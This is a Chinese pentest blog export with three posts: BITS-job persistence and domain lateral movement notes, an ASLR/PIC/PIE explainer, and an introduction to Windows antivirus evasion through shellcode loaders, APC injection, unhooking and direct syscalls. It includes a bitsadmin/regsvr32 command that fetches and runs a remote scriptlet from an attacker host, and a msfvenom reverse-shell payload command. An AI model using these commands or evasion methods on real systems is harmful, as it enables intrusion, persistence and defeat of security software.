bitsadmin <span class="token operator">/</span>resume backdoor
</code></pre>
<pre class=" language-powershell"><code class="language-powershell">bitsadmin <span class="token operator">/</span>list <span class="token comment" spellcheck="true"># 列出任务</span>
bitsadmin <span class="token operator">/</span>reset <span class="token comment" spellcheck="true"># 全部清空</span>
bitsadmin <span class="token operator">/</span>complete &lt;name> <span class="token comment" spellcheck="true"># 完成任务</span>
</code></pre>
<p>但是实际上打了一轮屁用没有。。。正向还是反向都收不到。addfile那里的文件下载就没有看到有东西被下下来。。。使用list倒是能看到显示已经TRANSFERRED，但是并没有文件出现，也没有收到shell，也没有端口监听。。。只有使用complete命令文件就被下载下来了，但是此时这个任务也被结束退出掉了，不会出现接下来的启动了。。。所以不如直接用之前的<code>bitsadmin /transfer</code>进行下载，直接在SetNotifyCmdLine处触发。<br>这里再次吐槽一下内网转发，msf虽然显示能够通过session在内网进行端口监听收reverse_tcp，但是我从来没有成功过。。。还是bind_tcp正向连接比较靠谱</p>
<p>查到了某个文章。。。白浪费那么多时间。。。</p>
<blockquote>
<p>Leveraging &#x2F;SetNotifyCmdLine we issue the &#x2F;Complete command and subsequently execute our payload. Without use of &#x2F;Complete BITS will leave our files in a tmp state and not move them to the correct directory within the file system. This usage of &#x2F;SetNotifyCmdLine along with &#x2F;Complete seem to be missing from most examples of using this tool</p>
</blockquote>
<p>这里还有一个全新的打法，因为刚才的打法需要文件落地，就要分成下载和利用两步。这里使用regsvr32.exe做到无文件落地的利用，整个流程只需要将<code>SetNotifyCmdLine</code>这一步的命令替换为msf对应handler中的输出即可<br>如<code>bitsadmin /SetNotifyCmdLine backdoor &quot;regsvr32.exe&quot; &quot;/s /n /u /i:http://192.168.68.139:8080/B2U10FAqa8gY.sct scrobj.dll&quot;</code><br>虽然无木马文件落地，但仍需要添加addfile才能运行，随便写个破烂url即可（但是实践时感觉不存在的破烂url有可能导致bitsadmin不会正常运行？）<br>msf中对应的handler为<code>exploit/multi/script/web_delivery</code>，用show targets查看可提供的payload类型<br>这里选择3，<code>Regsvr32</code>，不过这个打内网不太好打，因为需要目标直接回连msf。除非又整earthworm高强度打洞。这回确实看到回连了，但利用并未成功，进入目标一看PowerShell执行出错了，报错为<code>模块已加载 但对dllinstall的调用失败</code>。这就很难知道哪里出问题了，计划不通</p>
<p>为什么在这个奇怪的软件上花了这么多时间。。。。</p>
<h3 id="CS-jump一键打通"><a href="#CS-jump一键打通" class="headerlink" title="CS jump一键打通"></a>CS jump一键打通</h3><p>域环境下拿到一个域管号&#x3D;&#x3D;&#x3D;无敌<br>直接就着边缘机扫描，从获取的target下直接拿域管账号登录，启用一个smb listener正向连接，psexec上线<br>而我们拿下的边缘机上去就是域管登录，web服务也是我用域管手动启动的，拿到shell之后直接域管权限。mimikatz急速获取凭据。直接用域管凭据畅通无阻，想登录哪就登录哪。</p>
<h3 id="msf-psexec怎么打都打不通"><a href="#msf-psexec怎么打都打不通" class="headerlink" title="msf psexec怎么打都打不通"></a>msf psexec怎么打都打不通</h3><p>然后搜了一下msf的类似功能，也有一个模块，名为<code>exploit/windows/smb/psexec</code>，输入账号密码psexec进行移动，实战结果为，怎么打都打不通，正向反向都连不上。。。又是玄学内网？经典看到已经就着边缘机已经建立起的tcp连接，但是msf这边一直无法获取到session</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/m0_58177121/article/details/119836657">ATT&amp;CK红队评估实战靶场(一)</a><br><a href="https://blog.csdn.net/qq_42323763/article/details/115026477">ATT&amp;CK 实战（一）</a><br><a href="http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html">Temporal Persistence with bitsadmin and schtasks</a><br><a href="https://pentestlab.blog/2019/10/30/persistence-bits-jobs/">Persistence – BITS Jobs</a><br><a href="https://xz.aliyun.com/t/2536">后渗透之meterpreter使用攻略</a><br><a href="https://xz.aliyun.com/t/10626">红队攻防之特殊场景上线cs和msf</a><br><a href="http://sh1yan.top/2019/07/28/MSF-Command-Notes/">MSF之命令笔记篇</a><br><a href="https://xz.aliyun.com/t/2151">那些年，我们追过的“蓝”</a><br><a href="https://xz.aliyun.com/t/1654">Windows下载执行命令大全</a><br><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF.html">三大渗透测试框架权限维持技术</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>ASLR与PIC与PIE</title>
    <url>/ASLR%E4%B8%8EPIC%E4%B8%8EPIE.html</url>
    <content><![CDATA[<h1 id="ASLR与PIC与PIE"><a href="#ASLR与PIC与PIE" class="headerlink" title="ASLR与PIC与PIE"></a>ASLR与PIC与PIE</h1><p>简单的说就是看计算机基础的时候想起来函数调用的地址应当是在编译时确定的，而ASLR在运行时会对内存地址进行高强度随机化，那这样一来编译时写死的东西不就跑不起来了？然后开始的纠结和挣扎。二进制基础-&gt;0太难了啊。</p>
<h2 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h2><p>PLT与GOT表，这个是属于之前二进制入门的时候就学过的东西了。PLT位于代码段，可读可执行，GOT表位于数据段，可读可写。PLT和GOT表是动态链接时延迟加载的必备条件。PLT指向GOT表表项，GOT表初始每一项都指向PLT开始处的resolver，当函数第一次被调用时resolver解析函数加载在内存中的地址回填GOT表，即可实现对动态链接运行时加载的函数位置重定向。动态链接库声明的变量理论上来说也位于GOT表中。</p>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>Address Space Layout Randomization，地址随机化，能开几个程度的buff，0不开，1开了没完全开，2全开。理论上默认都是开到2<br>开1的话对共享库、栈、mmap和VDSO的地址随机化（VDSO是什么。。。），简单的说就是堆、数据段和代码段不会随机化<br>开2的话堆、数据段和代码段也全都随机化。用来防return2libc之类的攻击的。理论上已经学过<br>如果是只随机化堆栈的话，感觉防的是简单的栈溢出ret2shellcode，不过这年头栈都是不可执行的了吧。。。</p>
<h2 id="位置相关代码"><a href="#位置相关代码" class="headerlink" title="位置相关代码"></a>位置相关代码</h2><p>位置相关代码中，变量、函数等地址在编译时即被确定，均以绝对地址的形式编译进二进制文件。位置相关代码就没法随机化，开了随机化随机加载一下地址全乱就跑不起来了。<br>并且对于动态链接库而言，如果用位置相关代码，动态链接库被加载进其他进程空间中的地址是随机的，动态链接库中写死了地址的话，被加载进其他进程时也就运行不起来了</p>
<h2 id="PIC"><a href="#PIC" class="headerlink" title="PIC"></a>PIC</h2><p>position independent code，位置无关代码。位置相关是因为使用了绝对地址，那么位置无关就需要使用相对地址来解决问题。</p>
<p>然而相对地址就能实现随机化了吗？比如对于动态链接的函数，虽然会被解析到PLT和GOT表，但这两个表在加载的时候不会被随机而无法确定地址吗？想要明确的认识这一点，需要注意一个比较重要的事实。</p>
<p><strong>数据段和代码段的相对偏移总是保持不变的</strong></p>
<p>也就是说数据段和代码段在编译时就确定了他们的相对偏移，而在装载入内存时开启随机化，数据段和代码段是作为一个整体去随机化的，随机是对这两个段合起来的一个大段进行偏移，从而实现了在编译时确定的相对地址能够自由使用。<br>汇编中的CALL指令支持使用相对地址对函数进行调用，对于该程序内部实现的函数，可以在编译时确定好相对偏移，直接调用，而对于外部动态链接的函数，也可在编译时确定与PLT表项的相对偏移，在运行时等待PLT修改GOT表进而访问确切地址。<br>据说x86下的mov指令不支持使用相对地址，因此对于GOT表中导出的外部变量需要通过绝对地址访问。可以通过一个trick获取当前指令地址，再与编译时确定的GOT表表项偏移相加即可获得GOT表表项绝对地址。<br>PIC使得动态链接库可以被加载到随机地址，防范的是ret2libc攻击</p>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>理论上来说是为了配合aslr，加了这个buff就能随机化代码段好数据段，防止ret2ROP攻击<br>位置无关可执行程序，听起来好像和PIC没什么区别？引用一下gcc的文档</p>
<blockquote>
<p>-fpic<br>Generate position-independent code (PIC) suitable for use in a shared library…<br>-fpie<br>These options are similar to -fpic and -fPIC, but generated position independent code can be only linked into executables….</p>
</blockquote>
<p>似乎，就是fpic用于生成位置无关的动态链接库（说起来动态链接库如果地址有关也绝对跑不起来吧。。。），fpie则用来生成位置无关的可执行程序<br>实现的整体功能是类似的，但因为一个是生成动态链接库，一个是生成可执行程序，多少有些细微的差别，所以就变成了两个指令吧。<br>使用PIE选项编译出的可执行程序会在编译为位置无关代码<br>在PIE文件中，所有的全局变量都被放在GOT表内（包括本地全局变量？）</p>
<p>普通的程序入口位置是固定的，即不添加fpie生成的可执行程序是位置有关程序，因为程序的入口地址被固定在0x400000（x86下），直接从这个位置加载然后顺序排列过去，即使启动2级别的aslr，也无法随机化代码段和数据段，否则全乱。而加了pie选项之后可以生成位置无关的可执行程序，该方法生成的程序默认装载地址为0，在装载时会被链接器重定位</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.modb.pro/db/87717">深入理解 Linux 位置无关代码 PIC</a> 这个讲的很清楚<br><a href="https://luomuxiaoxiao.com/?p=516">Linux X86 程序启动 – main函数是如何被执行的？</a><br><a href="https://hansimov.gitbook.io/csapp/part2/ch07-linking/7.12-position-independent-code">位置无关代码</a><br><a href="https://zhuanlan.zhihu.com/p/68588184">CALL指令有多少种写法</a><br><a href="https://stackoverflow.com/questions/28119365/what-are-the-differences-comparing-pie-pic-code-and-executable-on-64-bit-x86-pl">What are the differences comparing PIE, PIC code and executable on 64-bit x86 platform?</a><br><a href="https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld">What is the -fPIE option for position-independent executables in gcc and ld?</a><br><a href="https://gcc.gnu.org/onlinedocs/gcc-4.8.0/gcc/Code-Gen-Options.html#Code-Gen-Options">gcc&#x2F;Code-Gen-Options.html</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>windows免杀入门</title>
    <url>/Windows%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="windows免杀入门"><a href="#windows免杀入门" class="headerlink" title="windows免杀入门"></a>windows免杀入门</h1><p>护网的时候遇到了一台火绒+windows defender+360拉满的机器，那个时候凭借我们的垃圾技术，完全打不进去，最后是学弟不知道加了多少buff用奇怪的套壳软件给套过去了，现在尝试着进行基础学习。</p>
<p>周末尝试和katzebin去看defcon qual，比去年还坐牢。。。</p>
<p>去年唯一一个web是一个解混淆的题，我还后续好歹学了下AST长点知识，今年这个题真有点莫名其妙，感觉吧，和web关系要大不大要小不小，完全看不懂。自闭了</p>
<p>然后还是继续学点windows吧。。。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在开始之前，需要配备一些前置知识。</p>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>就个人意见而言，shellcode就是一段能够执行目标命令的机器码，属于非常底层的payload类型，需要直接导入到内存的可执行区域并将指令寄存器指向shellcode的开头，pwn打的多应该挺好理解的，web垃圾还真就学了一下什么情况。。。。比如栈溢出时经典的系统调用反弹shell，对于更为现代的攻击者，使用msf或是CS进行攻击时，也可以通过生成raw的payload产生shellcode。</p>
<p>shellcode的运行方案也就如上文所言，加载进可执行的内存，并让指令寄存器指向shellcode开始处开始运行即可。以C为例，直接将shellcode用char数组声明一个变量，通过系统调用修改变量所在的地址为可执行，然后使用shellcode的地址作为函数指针直接一波调用过去即可。<br><a href="http://blog.leanote.com/post/snowming/e1a1266471dc">从一段代码理解函数指针</a><br><a href="https://blog.csdn.net/Kwansy/article/details/79328003">函数指针和shellcode</a><br><a href="https://luckyfuture.top/BypassAVLearning.html">从0开始写ShellCode加载器0x1-Windows内存操作api</a></p>
<h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><p>shellcode加载器常用的Windows API，当后面GO免杀模块的参考好了</p>
<p>这篇虽然是说进程注入的，但是对windows API和undocumented API还有系统调用说的很清楚。<br><a href="https://aliongreen.github.io/posts/remote-thread-injection.html">Process Injection: Remote Thread Injection or CreateRemoteThread</a></p>
<p>也就是大概权限分了三个层次，kernel32.dll，标准windows API，实现是对ntdll.dll中的native API（也叫做undocumented API）进行了一层包装。而直接使用system call的话则是直接和系统内核ntoskrnl.exe进行交互<br>windows在32位中使用sysenter进入内核，而64位则是syscall</p>
<p>native API由于实现比较原始，windows在外面套了一层标准API，这样子就使得windows可以修改native API但标准API不变，这也导致native API在不同的版本上用起来会出问题，以及native API大多以Nt或者Zw开头</p>
<h4 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h4><p>位于Kernel32.dll<br>经典内存申请函数</p>
<pre class=" language-C++"><code class="language-C++">LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
</code></pre>
<p>第一个参数指定在哪分配内存，是一个指针，设置为NULL就由系统决定，所以设置为NULL就行了，go里面的话由于使用系统调用传的参数都是uintptr，这个东西理论上就是一个无符号数，但里面装的东西一般被当做地址处理，填个0就代表NULL了<br>第二个也很简单，需要申请的内存大小，理论上应该go传参应该是uintptr，但这玩意既能当地址也能当unsigned int，所以直接塞个数字也行，似乎能隐式转换。并且文档上还写了很抽象的东西，说如果lpAddress是NULL的话会round to（四舍五入？）到下一页的边界。意思就是分配的内存大小不能跨页咯？<br>第三个参数为申请内存的类型，有几个定义的常量，一般使用MEM_COMMIT|MEM_RESERVE两个选项，RESERVE申请一块虚拟内存内存区，COMMIT将虚拟内存映射到物理内存，同样是直接传数字就行<br>第三个参数为内存的读写执行权限，选项很多，直接PAGE_EXECUTE_READWRITE读写执行拉满或者读写均可，也是数字，可以在<code>golang.org/x/sys/windows</code>这个包下面拿到（说起来这个应该是比较新的用来调用系统API的包，syscall理论上已经被弃用了，简单翻了一下好像实现了一些常用的接口？但某些不常见的API可能还是得用syscall去dll里翻）</p>
<p>有一个ex版VirtualAllocEx，再最前面加了一个参数</p>
<pre class=" language-C++"><code class="language-C++">LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
</code></pre>
<p>功能是在某个进程内申请一篇空间，所以第一个参数也就是对应进程的handler</p>
<h4 id="HeapAlloc"><a href="#HeapAlloc" class="headerlink" title="HeapAlloc"></a>HeapAlloc</h4><p>位于Kernel32.dll<br>另一个经典内存分配函数</p>
<pre class=" language-C++"><code class="language-C++">DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
  [in] HANDLE hHeap,
  [in] DWORD  dwFlags,
  [in] SIZE_T dwBytes
);
</code></pre>
<p>第一个参数为HeapCreate或GetProcessHeap返回的handler，第二个参数用来初始化堆，置零之类的，第三个参数长度</p>
<p>HeapCreate懒得写了。。。自己翻msdn</p>
<h4 id="ZwAllocateVirtualMemory"><a href="#ZwAllocateVirtualMemory" class="headerlink" title="ZwAllocateVirtualMemory"></a>ZwAllocateVirtualMemory</h4><p>位于NtosKrnl.exe，这不在dll里面啊？不懂ing<br>但是看现成的代码中的使用方案是从ntdll里面可以找到这个函数，属于undocumented API</p>
<pre class=" language-C++"><code class="language-C++">NTSYSAPI NTSTATUS ZwAllocateVirtualMemory(
  [in]      HANDLE    ProcessHandle,
  [in, out] PVOID     *BaseAddress,
  [in]      ULONG_PTR ZeroBits,
  [in, out] PSIZE_T   RegionSize,
  [in]      ULONG     AllocationType,
  [in]      ULONG     Protect
);
</code></pre>
<p>第一个参数文档上写得是个process的handler，但实际上我看直接用CreateHeap返回的handler也行<br>第二个起始地址，NULL由系统决定<br>第三个参数看不懂，得小于21，填0就是了<br>第四个参数为申请的大小<br>第五个参数是申请的类型，经典COMMIT<br>第六个参数经典读写执行</p>
<h4 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a>VirtualProtect</h4><p>位于Kernel32.dll<br>改内存权限的，看名字也能猜出来</p>
<pre class=" language-C++"><code class="language-C++">BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
</code></pre>
<p>前两个参数与VirtualAlloc一致，第三个参数和VirtualAlloc第四个参数一致，使用方法多为先alloc一个读写内存，shellcode写完再改成可执行，第四个参数锤子用没有，前面写了个out意为输出，是一个用来接收原来被改的这个内存权限的变量，必须传一个有效值，是NULL函数就自爆</p>
<p>同有一个EX版本，与VirtualAllocEx一致</p>
<h4 id="RtlCopyMemory"><a href="#RtlCopyMemory" class="headerlink" title="RtlCopyMemory"></a>RtlCopyMemory</h4><p>位于ntdll.dll<br>还有一个长得差不多的函数RtlMoveMemory，签名几乎都一样</p>
<pre class=" language-C++"><code class="language-C++">VOID RtlMoveMemory(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
);
</code></pre>
<p>这个签名也能很简单的猜出了怎么用。两个指针一个源一个目的地，一个长度，不过一个是移动一个是复制，移动的话估计移过去本来的地方就没了吧</p>
<h4 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h4><p>位于Kernel32.dll<br>获取进程对应的handler的函数，用于进程注入<br>CreateProcess则是直接创建新进程</p>
<pre class=" language-C++"><code class="language-C++">HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
</code></pre>
<p>第一个参数是需要的权限，buff有一堆，一般来说是<br>PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_QUERY_INFORMATION<br>第二个参数没仔细看，反正bool填0就是了<br>第三个参数为pid</p>
<h4 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h4><p>位于Kernel32.dll<br>用于跨进程写内存空间，进程注入或者创建新进程都用这个</p>
<pre class=" language-C++"><code class="language-C++">BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
</code></pre>
<p>第一个参数process handler，第二个写入的地址，不能置为NULL，使用VirtualAllocEx返回的地址即可，第三个源数据地址，第四个参数，第五个是输出写了多少字节</p>
<h3 id="windows版本号与对应系统版本"><a href="#windows版本号与对应系统版本" class="headerlink" title="windows版本号与对应系统版本"></a>windows版本号与对应系统版本</h3><p>似乎会存在某些API在某个版本之后才出现之类的情况，对于XP 2003等老系统而言尤为突出，而windows并不是后面的数字完全对应版本号的，需要略微进行了解</p>
<blockquote>
<ul>
<li>Windows NT 3.1、3.5、3.51</li>
<li>Windows NT 4.0</li>
<li>Windows 2000（NT 5.0）</li>
<li>Windows XP（NT 5.1）</li>
<li>Windows Server 2003（NT 5.2）</li>
<li>Windows Vista（NT 6.0）</li>
<li>Windows Server 2008（NT 6.0）</li>
<li>Windows 7（NT 6.1）</li>
<li>Windows Server 2008 R2（NT 6.1）</li>
<li>Windows Home Server</li>
<li>Windows 8（6.2）</li>
<li>Windows Server 2012（NT 6.2）</li>
<li>Windows 8.1（NT 6.3）</li>
<li>Windows Server 2012 R2（NT 6.3）</li>
<li>Windows 10（NT 6.4，现NT 10.0）</li>
<li>Windows Server 2016（NT 10.0）</li>
<li>Windows Server 2019（NT 10.0）</li>
<li>Windows Server 2022（NT 10.0）</li>
<li>Windows 11（NT 10.0）</li>
</ul>
</blockquote>
<p>理论上来说NT号即为版本<br><a href="https://zh.wikipedia.org/zh-sg/Microsoft_Windows%E7%9A%84%E5%8E%86%E5%8F%B2">Microsoft Windows的历史</a></p>
<h3 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h3><p>全称原来是Windows 32-bit on Windows 64-bit。。。用于在64位机器上跑32位程序。<br>windows的64位相关实现放在system32里（64位的实现却叫32），而32位的实现则放在WOW64里。。。真是抽象。<br>system32不改名是为了兼容旧系统上的程序，当32位的程序写死了路径在system32时，迁移到64位环境也不会出问题。但实际上32位迁移到64位后system32实际上应该是64位的实现，所以又做了一层路径映射，在64位程序上跑32位程序时，会将system32映射到wow64，也就导致了之前有一次攻击时程序显示自己是在system32目录但实际上运行上下文是wow64。</p>
<p>具体的实现是当32位程序在64位环境下运行时，会加载wow64的几个dll，这几个dll做一层代理把参数调成64位的样子传给64位的ntdll进行系统调用。</p>
<p>说起来32位和64位的寄存器长度都对不上，直接在64位的loader里加载32位的shellcode会原地爆炸<br>进程注入的时候也要确定一下目标进程的位数和shellcode的位数捏</p>
<p><a href="https://osfva.com/20210812203511-windows_wow64%E5%8E%9F%E7%90%86/">Windows WOW64原理</a><br><a href="https://bbs.pediy.com/thread-221236.htm">汇编里看Wow64的原理（浅谈32位程序是怎样在windows 64上运行的？）</a></p>
<p>但是我用go编译了一个x86的程序然后进程注入<code>C:\Windows\System32\notepad.exe</code>，直接改jetbrain家goland那里的架构好像屁用没有，最后是手改go环境变量命令行build出来的一个32位程序。确实拉起来的是syswow64下的32位notepad，然而程序在writeProcessMemory的时候就直接挂掉了。。。在64位机器上两个32位进程写内存不知道发生了什么问题，反正就是跑不起来。。。<br>直接写一个直接的shellcode加载编译成32位配合32位shellcode倒是可以在64位上跑起来，不过显然go也不支持xp这种远古垃圾，仍然在XP上是一个无效的win32程序</p>
<h3 id="APC"><a href="#APC" class="headerlink" title="APC"></a>APC</h3><p>Asynchronous Procedure Call，不知道中文是什么，直接翻译成异步过程调用好了。</p>
<blockquote>
<p>Asynchronous Procedure Call or APC is a function to run code in the context of another thread. every thread has it’s own queue of APCs. if the thread enters an alertable state it starts to do APC jobs in the form of first in first out (FIFO). A thread can enters an alertable state by using SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx functions.</p>
</blockquote>
<p>APC是一个在windows在单一线程上下文中实现任务队列的技术，一般被用来实现异步操作的回调。说起来js也是event loop+任务队列实现的单线程异步回调吧？</p>
<p>在攻击里则作为一种经典的进程注入手段<br>APC API均为undocumented API，所以在不同版本的操作系统上可能会出现些许问题（大概）<br>每个线程均拥有两个APC队列，一个用户态队列和一个内核态队列。攻击通过User APC进行。（显然你不能操作内核）</p>
<p>触发User APC有三种方式，等待进程进入alertable state，NtTestAlert主动清空APC队列，和win10 RS5版本后的Special User APC</p>
<h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><p>基础方案，就给目标线程指派一个APC，然后他什么时候进alertable state触发看命。svchost据说会经常处于该状态</p>
<blockquote>
<p>When a user-mode APC is queued, the thread to which it is queued is not directed to call the APC function unless it is in an alertable state. A thread enters an alertable state when it calls the SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx function</p>
</blockquote>
<h4 id="NtTestAlert"><a href="#NtTestAlert" class="headerlink" title="NtTestAlert"></a>NtTestAlert</h4><p>这个函数运行<code>before the lifetime of a thread</code>，该函数会检查当前线程的APC队列，并当队列中存在任务时，调用<code>KiUserApcDispatcher</code>完成队列中的任务<br>通过CreateProcess一个挂起的进程，再用QueueUserAPC加入任务，在Resume启动线程时，在线程启动前触发</p>
<h4 id="Special-User-APC"><a href="#Special-User-APC" class="headerlink" title="Special User APC"></a>Special User APC</h4><p>通过在win10 RS5发布的NtQueueApcThreadEx系统调用中强制执行APC。新科技对渗透没有用的嗼。渗透打的都是一万年前的垃圾机器，XP时有出现</p>
<h2 id="免杀方案"><a href="#免杀方案" class="headerlink" title="免杀方案"></a>免杀方案</h2><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>大二的时候下的一堆垃圾工具里就有这个东西，已经是6-7年前的古董了，并不是很好用。并且部分机器默认不支持运行ps1脚本，还得手动开一下</p>
<p>虽然里面有一些加解密ps脚本的工具，杀软也不能很好的检测这些工具加密出的恶意脚本，然而加密出的脚本需要通过加密工具还原，然后我直接把你的加密工具杀掉就好了。。。</p>
<p>并且感觉对win10的兼容堪忧，关了defender也在win10上跑不起来，在win7上倒是一路通畅，win7的defender多多少少有点垃圾，不加密直接把PowerSploit放上去跑也不报毒<br><a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a><br><a href="https://mp.weixin.qq.com/s/CiOaMnJBcEQfZXV_hopzLw">Mimikatz的18种免杀姿势及防御策略(上)</a></p>
<h3 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h3><p>就是在shellcode生成的时候加混淆，给shellcode加点密，整点花指令假判断什么的，传说中的经典UPX壳应该也是类似的操作？（不过好像套UPX壳的任何软件都直接被当做马杀了）比较出名的应该是msf的Shikata Ga Nai编码器。（效果似乎非常一般，落地就给defender杀了。。。）<br><a href="https://www.mandiant.com/resources/shikata-ga-nai-encoder-still-going-strong">Shikata Ga Nai Encoder Still Going Strong</a><br>19年的still strong，在22年看来还是有点过时了。<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15</code></p>
<p>在msf console中<code>show encoders</code>查看所有可用编码器，使用-i选项指定encoder套娃次数，也许多套几层就不会被杀了？</p>
<h3 id="去除用户态hook"><a href="#去除用户态hook" class="headerlink" title="去除用户态hook"></a>去除用户态hook</h3><p>部分杀软会在用户态hook部分函数以监控危险行为，通过去除hook的方式可以在一定程度 上进行免杀。<br>下面的汇编免杀则是通过绕过用户态函数，直接以汇编的形式发起系统调用绕过用户态API的hook。去除方式为加载硬盘上的文件与内存中的模块进行比对，不一致就重写重定向表把真实dll替换过来。加载这方面也要防hook所以也用到汇编高强度翻数据结构环节</p>
<p>这个文章比较详细的介绍了一种去除用户态hook的方法<br><a href="https://blogs.blackberry.com/en/2017/02/universal-unhooking-blinding-security-software">Universal Unhooking: Blinding Security Software</a></p>
<p>附了一个仓库，给了点工具，尝试去除hook后内存加载马大战windows defender，然后被defender瞬杀。这个故事告诉我们，defender应该不是用户态hook，可能直接内核hook或者有其他的什么监控方式吧。。。吴迪</p>
<h3 id="汇编免杀"><a href="#汇编免杀" class="headerlink" title="汇编免杀"></a>汇编免杀</h3><p>通过直接翻加载进内存的ntdll的PEB翻数据结构，直接找到系统调用的syscall，以汇编直接发起syscall</p>
<p>成熟的解决方案<a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a></p>
<p>以该项目为例，<a href="https://github.com/mai1zhi2/ShellCodeFramework">ShellCodeFramework</a><br>使用汇编进行系统调用，加载shellcode。这个是作者的介绍文章<br><a href="https://www.52pojie.cn/thread-1360548-1-1.html">shellcode免杀框架内附SysWhispers2_x86直接系统调用</a><br>不过实际上前面那段自己实现shellcode的部分不适合我。。。还是直接套CS和msf比较好。</p>
<p>该项目的Syscalls.h&#x2F;c&#x2F;asm来应该是源自于SysWhispers的，然而SysWhispers生成的payload仅支持在64位windows机器上运行（但是shellcode这个项目编译感觉又得选x86进行编译。。。），也有可能是因为这个项目shellcode加载部分的代码是只适配x86的，但是我C++水平有限，没法写出稍微复杂一点的shellcode加载器。。。。</p>
<p>实际上这里使用的Syscalls.h&#x2F;c&#x2F;asm应该是作者自己魔改的支持32位的SysWhispers<br><a href="https://github.com/mai1zhi2/SysWhispers2_x86">SysWhispers2_x86</a></p>
<p>该项目的整体思路并不复杂，用aes对shellcode进行了一轮加密，将shellcode放在一个特定的数据段(.edata)中，使用时将shellcode解密，系统调用该内存段变成可执行，将指令寄存器指向shellcode地址完成（C++手写AES麻烦的要死，作者也是抄的现成代码）。该项目使用aes加密防止了对明文shellcode的检测（现在msf，cs这类生成的明文shellcode是个杀软就能查出来，没编译就一串16进制数都能给你抓了。。。），而对于修改shellcode内存为可执行这一步关键操作，则使用SysWhispers产生的汇编进行系统调用，绕过杀软。</p>
<h4 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h4><p>然而这个项目踩了不少坑。。。<br>首先项目采用Release+x86进行编译，项目两个loader都编译成32位可执行文件的，理论上sysenter用于在x86机器上运行，wow64在x64机器上运行。不编译成64位的主要原因在于shellcode加载器中有一些数据结构似乎x86 x64不兼容，而我也不会改。。。</p>
<h5 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h5><p>首先一个是缺dll，动态链接生成的木马在目标没有安装C++开发环境的情况下缺一堆dll，解决方案也很简单，搜一下怎么静态链接，在<code>属性-&gt;C/C++-&gt;代码生成</code>处，把运行库改成<code>多线程(/MT)</code>即可</p>
<h5 id="系统兼容性"><a href="#系统兼容性" class="headerlink" title="系统兼容性"></a>系统兼容性</h5><p>直接就着项目编译出来的马只能在win10上运行，win7和win2008均直接退出，估计原因是作者的syswhispers是自己魔改过的支持x86的，存在迷之bug，重新下了个syswhispers2重新生成了一套payload就跑起来了</p>
